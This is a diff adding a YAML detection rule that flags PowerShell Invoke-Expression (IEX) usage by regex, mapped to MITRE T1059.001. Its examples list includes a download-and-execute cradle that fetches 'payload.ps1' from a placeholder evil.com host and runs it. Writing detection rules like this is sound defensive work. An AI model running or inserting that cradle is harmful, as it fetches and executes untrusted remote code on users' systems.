@@ -1,0 +1,34 @@
+# PowerShell Pattern: Invoke-Expression Usage
+# Detects use of Invoke-Expression cmdlet for code execution
+
+id: PS-001
+name: Invoke-Expression Usage
+description: |
+  Detects use of Invoke-Expression (IEX) cmdlet, which executes arbitrary strings
+  as PowerShell commands. This is commonly used in malicious scripts for dynamic
+  code execution and obfuscation. Attackers often use IEX to execute downloaded
+  payloads or decode obfuscated commands.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)\b(Invoke-Expression|IEX)\b'
+severity: Critical
+mitre_technique: T1059.001
+confidence: 0.9
+category: command_injection
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-15"
+  updated: "2025-01-15"
+  references:
+    - "https://attack.mitre.org/techniques/T1059/001/"
+    - "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression"
+  tags:
+    - powershell
+    - code-execution
+    - obfuscation
+  examples:
+    - "Invoke-Expression $downloadedScript"
+    - "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+    - "$cmd = 'Get-Process'; Invoke-Expression $cmd"
